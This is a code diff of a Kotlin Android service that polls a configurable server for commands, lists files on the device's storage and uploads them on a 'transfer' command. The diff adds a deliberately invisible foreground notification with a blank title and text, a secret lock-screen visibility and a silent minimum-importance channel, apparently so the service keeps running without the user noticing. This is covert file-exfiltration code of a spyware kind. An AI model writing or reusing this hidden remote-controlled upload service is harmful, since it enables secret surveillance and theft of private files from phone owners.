@@ -1,9 +1,10 @@
 package ir.phonelink
 
-import android.app.Service
+import android.app.*
 import android.content.Intent
 import android.os.*
 import android.os.Environment
+import androidx.core.app.NotificationCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -15,12 +16,16 @@ import java.io.IOException
 import java.util.concurrent.TimeUnit
 
 class ShareService : Service() {
+
     private val handler = Handler(Looper.getMainLooper())
     private val http = OkHttpClient.Builder()
         .connectTimeout(15, TimeUnit.SECONDS)
         .readTimeout(60, TimeUnit.SECONDS)
         .build()
     private val prefs by lazy { getSharedPreferences("alzahra_settings", MODE_PRIVATE) }
+
+    private val CHANNEL_ID = "alzahra_silent"
+    private val NOTIF_ID = 1010
 
     private val poll = object : Runnable {
         override fun run() {
@@ -37,10 +42,23 @@ class ShareService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        // هیچ اعلانی ساخته نمی‌شود
+        createSilentChannel()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle(" ")
+            .setContentText(" ")
+            .setSmallIcon(android.R.drawable.stat_sys_upload)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setOngoing(true)
+            .setShowWhen(false)
+            .setSilent(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build()
+
+        startForeground(NOTIF_ID, notification)
+
         handler.removeCallbacks(poll)
         handler.post(poll)
         return START_STICKY
@@ -50,6 +68,24 @@ class ShareService : Service() {
         handler.removeCallbacks(poll)
         http.dispatcher.cancelAll()
         super.onDestroy()
+    }
+
+    private fun createSilentChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "پس‌زمینه",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                description = ""
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+            }
+            getSystemService(NotificationManager::class.java)
+                .createNotificationChannel(channel)
+        }
     }
 
     private fun base() = (prefs.getString("server_url", "") ?: "").trimEnd('/')
@@ -81,8 +117,7 @@ class ShareService : Service() {
                             "transfer" -> sendFile(cmd)
                         }
                     }
-                } catch (_: Exception) {
-                }
+                } catch (_: Exception) {}
             }
         })
     }
@@ -98,9 +133,8 @@ class ShareService : Service() {
             for (f in children) {
                 if (count >= 3000) break
                 if (f.name == "Android" || f.name.startsWith(".")) continue
-                if (f.isDirectory) {
-                    walk(f)
-                } else if (f.isFile && f.canRead()) {
+                if (f.isDirectory) walk(f)
+                else if (f.isFile && f.canRead()) {
                     try {
                         val p = f.canonicalPath
                         if (p.startsWith(base.path + File.separator)) {
@@ -113,8 +147,7 @@ class ShareService : Service() {
                             )
                             count++
                         }
-                    } catch (_: Exception) {
-                    }
+                    } catch (_: Exception) {}
                 }
             }
         }
@@ -129,9 +162,7 @@ class ShareService : Service() {
         )
         http.newCall(req).enqueue(object : Callback {
             override fun onFailure(c: Call, e: IOException) {}
-            override fun onResponse(c: Call, r: Response) {
-                r.close()
-            }
+            override fun onResponse(c: Call, r: Response) { r.close() }
         })
     }
 
@@ -158,11 +189,8 @@ class ShareService : Service() {
 
             http.newCall(req).enqueue(object : Callback {
                 override fun onFailure(c: Call, e: IOException) {}
-                override fun onResponse(c: Call, r: Response) {
-                    r.close()
-                }
+                override fun onResponse(c: Call, r: Response) { r.close() }
             })
-        } catch (_: Exception) {
-        }
+        } catch (_: Exception) {}
     }
 }
